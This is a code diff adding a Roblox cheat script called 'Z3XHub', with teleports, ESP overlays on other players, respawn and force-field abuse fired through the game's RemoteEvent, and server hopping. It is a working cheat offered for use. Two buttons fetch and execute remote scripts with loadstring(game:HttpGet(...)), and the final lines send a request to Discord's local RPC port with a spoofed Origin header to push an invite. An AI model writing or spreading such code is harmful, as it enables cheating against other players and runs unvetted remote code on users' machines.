+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.ScrollBarThickness = 12
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.HeaderTxt1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.HeaderTxt1.TextColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame3.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame5.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame6.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame6.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame6.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame6.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame7.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame7.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame7.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame7.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame8.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame8.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame8.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame8.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame9.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame9.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame9.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.MaxFrame9.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            Corner.Parent = LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.RankImgBtn
+            Corner.CornerRadius = UDim.new(1, 0)
+            UIStroke.Parent = LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.RankImgBtn
+            UIStroke.Color = Color3.fromRGB(100, 100, 100)
+            UIStroke.Thickness = 2.5
+            if LocalPlayer.PlayerGui.ScreenGui.MenuBtn then
+                LocalPlayer.PlayerGui.ScreenGui.MenuBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)
+                LocalPlayer.PlayerGui.ScreenGui.MenuBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+            end
+            if LocalPlayer.PlayerGui.ScreenGui.CurrentGemImgBtn.AmountTxtBtn then
+                LocalPlayer.PlayerGui.ScreenGui.CurrentGemImgBtn.AmountTxtBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
+                LocalPlayer.PlayerGui.ScreenGui.CurrentGemImgBtn.AmountTxtBtn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+                LocalPlayer.PlayerGui.ScreenGui.CurrentGemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            end
+        end)
+    end,
+})
+
+Visual:CreateButton({
+    Name = 'LeaderBoards On Spawn',
+    Callback = function()
+        pcall(function()
+            local positions = {CFrame.new(359, 252, 830),CFrame.new(359, 252, 810),CFrame.new(359, 252, 790),CFrame.new(359, 264, 830),CFrame.new(359, 264, 810)}
+            local index = 0;
+            for _, v in pairs(workspace.Main:GetChildren()) do
+                if v:IsA('Part') and v.Name:match('LeaderBoardPart') then
+                    index = index + 1
+                    v.CFrame = positions[index]
+                    v.Orientation = Vector3.new(0, 90, 0)
+                    v.Size = Vector3.new(20, 12, 2)
+                    v.Material = Enum.Material.ForceField
+                end
+            end
+            index = nil
+        end)
+    end,
+})
+
+Usual:CreateButton({
+    Name = 'Fast Teleport',
+    Callback = function()
+        LocalPlayer:GetMouse().KeyDown:Connect(function(key, p)
+            if p then return end
+            if key == 'v' then
+                if LocalPlayer:GetMouse().Target then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame - (LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(LocalPlayer:GetMouse().Hit.X, LocalPlayer:GetMouse().Hit.Y + 5, LocalPlayer:GetMouse().Hit.Z))
+                end
+            end
+        end)
+    end,
+})
+
+Usual:CreateDropdown({
+    Name = 'Animations',
+    Options = {'None','Bubbly','Astronaut','Cartoony','Elder','Knight','Levitation','Mage','Ninja','Pirate','Robot','Stylish','Superhero','Toy','Vampire','Werewolf','Zombie','Ghost'},
+    CurrentOption = {'None'},
+    MultipleOptions = false,
+    Flag = 'Animations',
+    Callback = function()
+        if unpack(Flags['Animations']) ~= 'None' then
+            for _, v in pairs(animations[unpack(Flags['Animations']):lower()]) do
+                local action, subAction, assetId = unpack(v)
+                LocalPlayer.Character:FindFirstChild('Animate')[action][subAction].AnimationId = assetId
+            end
+        end
+    end,
+})
+
+Usual:CreateSlider({
+    Name = 'Fov',
+    Range = {0, 120},
+    Increment = 1,
+    CurrentValue = 70,
+    Flag = 'Fov',
+    Callback = function()
+        Camera.FieldOfView = Flags['Fov']
+    end,
+})
+
+
+Fun:CreateSlider({
+    Name = 'Spin',
+    Range = {0, 1000},
+    Increment = 1,
+    CurrentValue = 60,
+    Flag = 'SpinSpeed',
+    Callback = function()
+        if Flags['Spin'] and LocalPlayer.Character then
+            if LocalPlayer.Character.HumanoidRootPart:FindFirstChild('Spin') then
+                LocalPlayer.Character.HumanoidRootPart.Spin.AngularVelocity = Vector3.new(0, Flags['SpinSpeed'], 0)
+            end
+        end
+    end,
+})
+
+Fun:CreateSlider({
+    Name = 'Gravity ',
+    Range = {0, 1000},
+    Increment = 1,
+    CurrentValue = 60,
+    Flag = 'GravityValue',
+    Callback = function()
+        if Flags['Gravity'] then
+            workspace.Gravity = Flags['GravityValue']
+        else
+            workspace.Gravity = StockGravity
+        end
+    end,
+})
+
+Fun:CreateButton({
+    Name = 'BallFe',
+    Callback = function()
+
+        local SPEED_MULTIPLIER = 30
+        local JUMP_POWER = 60
+        local JUMP_GAP = 0.3
+        local character = LocalPlayer.Character
+
+        for _, v in pairs(character:GetDescendants()) do
+            if v:IsA('BasePart') then
+                v.CanCollide = false
+            end
+        end
+
+        local ball = character.HumanoidRootPart
+        ball.Shape = Enum.PartType.Ball
+        ball.Size = Vector3.new(5, 5, 5)
+        local humanoid = character:WaitForChild('Humanoid', math.huge)
+        local params = RaycastParams.new()
+        params.FilterType = Enum.RaycastFilterType.Blacklist
+        params.FilterDescendantsInstances = {character}
+        local tc = RunService.RenderStepped:Connect(function(delta)
+            ball.CanCollide = true
+            humanoid.PlatformStand = true  
+            if UserInputService:GetFocusedTextBox() then return end
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+                ball.RotVelocity = ball.RotVelocity - Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+                ball.RotVelocity = ball.RotVelocity - Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+                ball.RotVelocity = ball.RotVelocity + Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
+            end
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+                ball.RotVelocity = ball.RotVelocity + Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
+            end
+        end)
+        UserInputService.JumpRequest:Connect(function()
+            local result = workspace:Raycast(ball.Position, Vector3.new(0, -((ball.Size.Y / 2) + JUMP_GAP), 0), params)
+            if result then
+                ball.Velocity = ball.Velocity + Vector3.new(0, JUMP_POWER, 0)
+            end
+        end)
+        Camera.CameraSubject = ball
+        if not ball then
+            ball = true
+            humanoid.Died:Connect(function()
+                tc:Disconnect()
+            end)
+        end
+    end,
+})
+
+Fun:CreateButton({
+    Name = 'Enable Collision',
+    Callback = function()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character.HumanoidRootPart then
+                player.Character.HumanoidRootPart.CollisionGroup = 'Default'
+            end
+        end
+    end,
+})
+
+local teleports = {
+    {'SafeZone', CFrame.new(471, 249, 889)},
+    {'LeaderBoards', CFrame.new(-766, 249, 750)},
+    {'FS Rock', CFrame.new(382, 249, 971)},
+    {'FS Crystal', CFrame.new(-2273, 1943, 1048)},
+    {'FS 1B', CFrame.new(1176, 4789, -2293)},
+    {'FS 100B', CFrame.new(1381, 9274, 1648)},
+    {'FS 10T', CFrame.new(-363, 15735, -3)},
+    {'PP 1M', CFrame.new(-2527, 5486, -532)},
+    {'PP 1B', CFrame.new(-2560, 5500, -439)},
+    {'PP 1T', CFrame.new(-2582, 5516, -504)},
+    {'PP 1Qa', CFrame.new(-2544, 5412, -495)},
+    {'BT 100', CFrame.new(365, 249, -445)},
+    {'BT 10K', CFrame.new(349, 263, -490)},
+    {'BT 100K', CFrame.new(1640, 258, 2244)},
+    {'BT 1M', CFrame.new(-2307, 976, 1068)},
+    {'BT 10M', CFrame.new(-2024, 714, -1860)},
+    {'BT 1B', CFrame.new(-254, 286, 980)},
+    {'BT 100B', CFrame.new(-271, 279, 991)},
+    {'BT 10T', CFrame.new(-279, 279, 1007)}
+}
+
+for _, teleport in pairs(teleports) do
+    Teleports:CreateButton({
+        Name = teleport[1],
+        Callback = function()
+            LocalPlayer.Character.HumanoidRootPart.CFrame = teleport[2]
+        end,
+    })
+end
+
+LocalPlayer.PlayerGui.IntroGui:GetPropertyChangedSignal('Enabled'):Connect(function()
+    LocalPlayer.PlayerGui.IntroGui.Enabled = false
+end)
+
+LocalPlayer.PlayerGui.ScreenGui:GetPropertyChangedSignal('Enabled'):Connect(function()
+    LocalPlayer.PlayerGui.ScreenGui.Enabled = true
+end)
+
+Lighting.Blur:GetPropertyChangedSignal('Enabled'):Connect(function()
+    Lighting.Blur.Enabled = false
+end)
+
+Settings:CreateButton({
+    Name = 'Re-join',
+    Callback = function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+    end
+})
+
+Settings:CreateButton({
+    Name = 'Hop Server (High)',
+    Callback = function()
+        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, string.match(game:HttpGet('https://raw.githubusercontent.com/selftilted/hopserver/main/data.txt'), '%s([^%s]+)'))
+    end
+})
+
+Settings:CreateButton({
+    Name = 'Hop Server (Low)',
+    Callback = function()
+        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, string.match(game:HttpGet('https://raw.githubusercontent.com/selftilted/hopserver/main/data.txt'),'([^%s]+)'))
+    end
+})
+
+Settings:CreateButton({
+    Name = 'Fps Booster',
+    Callback = function()
+        for _, v in pairs(game:GetDescendants()) do
+            ---@diagnostic disable-next-line: invalid-class-name
+            if v:IsA('Part') or v:IsA('Union') or v:IsA('CornerWedgePart') or v:IsA('TrussPart') then
+                v.Material = 'Plastic'
+                v.Reflectance = 0
+            elseif v:IsA('Decal') or v:IsA('Texture') and decalsyeeted then
+                v.Transparency = 1
+            elseif v:IsA('ParticleEmitter') or v:IsA('Trail') then
+                v.Lifetime = NumberRange.new(0)
+            elseif v:IsA('Explosion') then
+                v.BlastPressure = 1
+                v.BlastRadius = 1
+            elseif v:IsA('Fire') or v:IsA('SpotLight') or v:IsA('Smoke') then
+                v.Enabled = false
+            elseif v:IsA('MeshPart') then
+                v.Material = 'Plastic'
+                v.Reflectance = 0
+                v.TextureID = 10385902758728957
+            end
+        end
+
+        for _, v in pairs(Lighting:GetChildren()) do
+            if v:IsA('BlurEffect') or v:IsA('SunRaysEffect') or v:IsA('ColorCorrectionEffect') or v:IsA('BloomEffect') or v:IsA('DepthOfFieldEffect') then
+                v.Enabled = false
+            end
+        end
+    end
+})
+
+Settings:CreateButton({
+    Name = 'IY',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end
+})
+
+Settings:CreateButton({
+    Name = 'Dark Dex',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'))()
+    end
+})
+
+Settings:CreateButton({
+    Name = 'JobID',
+    Callback = function()
+        Rayfield:Notify({
+            Title = 'Z3XHub',
+            Content = 'Copied to your clipboard!',
+            Duration = 5,
+        })
+        setclipboard(game.JobId)
+    end
+})
+
+Settings:CreateKeybind({
+    Name = 'Toggle Z3XHub',
+    CurrentKeybind = 'H',
+    HoldToInteract = false,
+    Flag = 'ToggleUI',
+    Callback = function()
+        getgenv().CloseKey = Flags['ToggleUI']
+    end,
+})
+
+Settings:CreateKeybind({
+    Name = 'Panic Key',
+    CurrentKeybind = 'Y',
+    HoldToInteract = false,
+    Flag = 'PanicKey',
+    Callback = function()
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470, 250, 900)
+    end,
+})
+
+Settings:CreateKeybind({
+    Name = 'Respawn',
+    CurrentKeybind = 'F1',
+    HoldToInteract = false,
+    Flag = 'RespawnF1',
+    Callback = function()
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+            savepos = LocalPlayer.Character.HumanoidRootPart.CFrame
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1e9, -1e6, 1e9)
+        end
+        RemoteEvent:FireServer({'Respawn'}) 
+    end,
+})
+
+local updating_stats = {
+    {'FistStrength', 'Fist'},
+    {'BodyToughness', 'Body'},
+    {'PsychicPower', 'Psychic'}
+}
+
+for _, v in pairs(Players:GetPlayers()) do
+    task.spawn(function()
+        if v ~= LocalPlayer then
+            local PrivateStats = v:WaitForChild('PrivateStats', math.huge)
+            local leaderstats = v:WaitForChild('leaderstats', math.huge)
+            local Status = leaderstats:WaitForChild('Status', math.huge)
+
+            for _, v2 in pairs(updating_stats) do
+                PrivateStats:WaitForChild(v2[1], math.huge):GetPropertyChangedSignal('Value'):Connect(function()
+                    if game.CoreGui.ESPFolder:FindFirstChild(v.Name) and game.CoreGui.ESPFolder[v.Name]:FindFirstChild('Frame') and game.CoreGui.ESPFolder[v.Name].Frame:FindFirstChild(v2[2]) then
+                        game.CoreGui.ESPFolder[v.Name].Frame[v2[2]].Text = v2[2] .. ': ' .. converttoletter(v:FindFirstChild('PrivateStats')[v2[1]].Value)
+                    end
+                end)
+            end
+
+        Status:GetPropertyChangedSignal('Value'):Connect(function()
+                if game.CoreGui.ESPFolder:FindFirstChild(v.Name) and game.CoreGui.ESPFolder[v.Name]:FindFirstChild('Frame') and game.CoreGui.ESPFolder[v.Name].Frame:FindFirstChild('Names') then
+                    game.CoreGui.ESPFolder[v.Name].Frame.Names.TextColor3 = updateColor(v.leaderstats.Status.Value)
+                    game.CoreGui.ESPFolder[v.Name].Frame.Names.TextStrokeColor3 = updateColorStroke(v.leaderstats.Status.Value)
+                end
+                if v.Character and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
+                    for _, v2 in pairs(v.Character:GetChildren()) do
+                        if v2.Name == 'Highlight' then
+                            v2.FillColor = updateColor(v.leaderstats.Status.Value)   
+                            v2.OutlineColor = updateColor(v.leaderstats.Status.Value)
+                        end
+                    end
+                end
+            end)
+
+            if v.Character and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
+                v.Character.Humanoid.Died:Connect(function()
+                    game.StarterGui:SetCore('ChatMakeSystemMessage', ({Text = v.DisplayName .. ' (@' .. v.Name .. ') Dead', Color = Color3.fromRGB(255, 0, 0), Font = 'GothamBold', TextSize = 20}))
+                end)
+            end
+
+            v.CharacterAdded:Connect(function(character)
+                if Flags['Esp'] then
+                    CreateESP(character, v)
+                end
+                if Flags['Highlights'] then
+                    CreateHighlight(character, v)
+                end
+                character:WaitForChild('Humanoid', math.huge).Died:Connect(function()
+                    game.StarterGui:SetCore('ChatMakeSystemMessage', ({Text = v.DisplayName .. ' (@' .. v.Name .. ') Dead', Color = Color3.fromRGB(255, 0, 0), Font = 'GothamBold', TextSize = 20}))
+                end)
+            end)
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    game.StarterGui:SetCore('ChatMakeSystemMessage', {Text = player.DisplayName .. ' (@' .. player.Name .. ') Has joined',Color = Color3.fromRGB(0, 255, 26),Font = 'GothamBold',TextSize = 20})
+
+    if spy then
+        player.Chatted:Connect(function(msg) onChatted(player, msg) end)
+    end
+    
+    player.CharacterAdded:Connect(function(character)
+        if Flags['Esp'] then
+            CreateESP(character, player)
+        end
+        if Flags['Highlights'] then
+            CreateHighlight(character, player)
+        end
+        character:WaitForChild('Humanoid', math.huge).Died:Connect(function()
+            game.StarterGui:SetCore('ChatMakeSystemMessage', ({Text = player.DisplayName .. ' (@' .. player.Name .. ') Dead', Color = Color3.fromRGB(255, 0, 0), Font = 'GothamBold', TextSize = 20}))
+        end)
+    end)
+
+    local PrivateStats = player:WaitForChild('PrivateStats', math.huge)
+    local leaderstats = player:WaitForChild('leaderstats', math.huge)
+    local Status = leaderstats:WaitForChild('Status', math.huge)
+
+    for _, v in pairs(updating_stats) do
+        PrivateStats:WaitForChild(v[1], math.huge):GetPropertyChangedSignal('Value'):Connect(function()
+            if game.CoreGui.ESPFolder:FindFirstChild(player.Name) and game.CoreGui.ESPFolder[player.Name]:FindFirstChild('Frame') and game.CoreGui.ESPFolder[player.Name].Frame:FindFirstChild(v[2]) then
+                game.CoreGui.ESPFolder[player.Name].Frame[v[2]].Text = v[2] .. ': ' .. converttoletter(player:FindFirstChild('PrivateStats')[v[1]].Value)
+            end
+        end)
+    end
+
+    Status:GetPropertyChangedSignal('Value'):Connect(function()
+        if game.CoreGui.ESPFolder:FindFirstChild(player.Name) and game.CoreGui.ESPFolder[player.Name]:FindFirstChild('Frame') and game.CoreGui.ESPFolder[player.Name].Frame:FindFirstChild('Names') then
+            game.CoreGui.ESPFolder[player.Name].Frame.Names.TextColor3 = updateColor(player.leaderstats.Status.Value)
+            game.CoreGui.ESPFolder[player.Name].Frame.Names.TextStrokeColor3 = updateColorStroke(player.leaderstats.Status.Value)
+        end
+        if workspace:FindFirstChild(player.Name) and workspace[player.Name].Humanoid and workspace[player.Name].Humanoid.Health > 0 then
+            for _, v2 in pairs(workspace[player.Name]:GetChildren()) do
+                if v2.Name == 'Highlight' then
+                    v2.FillColor = updateColor(player.leaderstats.Status.Value)   
+                    v2.OutlineColor = updateColor(player.leaderstats.Status.Value)
+                end
+            end
+        end
+    end)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    game.StarterGui:SetCore('ChatMakeSystemMessage', {Text = player.DisplayName .. ' (@' .. player.Name .. ') Has left',Color = Color3.fromRGB(255, 0, 0),Font = 'GothamBold',TextSize = 20})
+    for _, v in pairs(game.CoreGui.ESPFolder:GetChildren()) do
+        if v.Name == player.Name then
+            v:Destroy()
+        end
+    end
+    if table.find(targets, player.Name) then
+        for _, v in pairs(targets) do
+            if v == player.Name then
+                table.remove(targets, i)
+            end
+        end
+    end
+end)
+
+function is_aura_enabled()
+    for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
+        if v.Name ~= 'KillingIntentAuraSound' and v.Name:match('Aura') then
+            return true
+        end
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    local teleported = false
+    if Flags['Stack'] then
+        task.spawn(function()
+            local savepos = nil
+            local body = Instance.new('BodyVelocity')
+            body.Name = 'StackVel'
+            body.Parent = character:WaitForChild('HumanoidRootPart', math.huge)
+            body.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            while Flags['Stack'] and task.wait(0) do
+                body.Velocity = Vector3.new(math.random(-20000, 4000), math.random(2000, 4000), math.random(-16000, 4000))
+            end
+        end)
+    end
+
+    if Flags['ForceFieldAbuse'] then
+        task.spawn(function()
+            --repeat task.wait(0) until LocalPlayer.Character:FindFirstChild('ForceField')
+            --repeat task.wait(0) until not LocalPlayer.Character:FindFirstChild('ForceField')
+            task.wait(4)
+            RemoteEvent:FireServer({'Respawn'})
+        end)
+    end
+
+    if savepos and not Flags['ForceFieldAbuse'] and not Flags['Stack'] then
+        task.spawn(function()
+            character:WaitForChild('HumanoidRootPart', math.huge):GetPropertyChangedSignal('CFrame'):Wait()
+            character.HumanoidRootPart.CFrame = savepos
+            teleported = true
+        end)
+        task.spawn(function()
+            task.wait(1)
+            if not teleported and savepos then
+                character.HumanoidRootPart.CFrame = savepos
+            end
+        end)
+    end
+    
+    if Flags['Spin'] then 
+        task.spawn(function()
+            local bodyang = Instance.new('BodyAngularVelocity')
+            bodyang.Name = 'Spin'
+            bodyang.Parent = character:WaitForChild('HumanoidRootPart', math.huge)
+            bodyang.MaxTorque = Vector3.new(0, math.huge, 0)
+            bodyang.AngularVelocity = Vector3.new(0, Flags['SpinSpeed'], 0)
+        end)
+    end
+
+    if Flags['AutoSuperAura'] then
+        task.spawn(function()
+            task.wait(0.5)
+            RemoteEvent:FireServer({'ConcealRevealAura', 'Start'})
+        end)
+    elseif Flags['AutoDisableAura'] then
+        task.spawn(function()
+            repeat task.wait(0) until is_aura_enabled()
+            RemoteEvent:FireServer({'ConcealRevealAura', 'Start'})
+        end)
+    end
+
+    if unpack(Flags['Animations']) ~= 'None' then
+        task.spawn(function()
+            for _, v in pairs(animations[unpack(Flags['Animations']):lower()]) do
+                local action, subAction, assetId = unpack(v)
+                LocalPlayer.Character:FindFirstChild('Animate')[action][subAction].AnimationId = assetId
+            end
+        end)
+    end
+
+    if not Flags['ForceFieldAbuse'] and not Flags['Stack'] then
+        task.spawn(function()
+            func = character:WaitForChild('Humanoid', math.huge):GetPropertyChangedSignal('Health'):Connect(function()
+                if character.Humanoid.MaxHealth * respawnhp > character.Humanoid.Health then
+                    func:Disconnect()
+                    savepos = character.HumanoidRootPart.CFrame
+                    character.HumanoidRootPart.CFrame = CFrame.new(-1e9, -1e6, 1e9)
+                    RemoteEvent:FireServer({'Respawn'})
+                end
+            end)
+        end)
+    end
+end)
+
+workspace.Storage.ChildAdded:Connect(function(child)
+    if child.Name:match('EnergySphere') then
+        task.wait(0)
+        if Flags['BlackBalls'] then
+            child.Color = Color3.fromHSV(0, 0, 0)
+            child.Transparency = 0
+        elseif Flags['RGBBalls'] then
+            while table.find(workspace.Storage:GetChildren(), child) and task.wait(0) do
+                child.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                child.Transparency = 0
+            end
+        end
+    end
+end)
+
+if LocalPlayer.Character then
+    RemoteEvent:FireServer({'Respawn'})
+end
+
+Rayfield:Notify({
+    Title = 'Z3XHub',
+    Content = 'Welcome, ' .. LocalPlayer.Name .. '.',
+    Duration = 5,
+})
+
+request({Url = 'http://127.0.0.1:6463/rpc?v=1',Method = 'POST',Headers = {['Content-Type'] = 'application/json',Origin = 'https://discord.com'},Body = HttpService:JSONEncode({cmd = 'INVITE_BROWSER',nonce = HttpService:GenerateGUID(false),args = {code = 'Q6MajxVges'}})})
+
+getgenv().Loaded = true
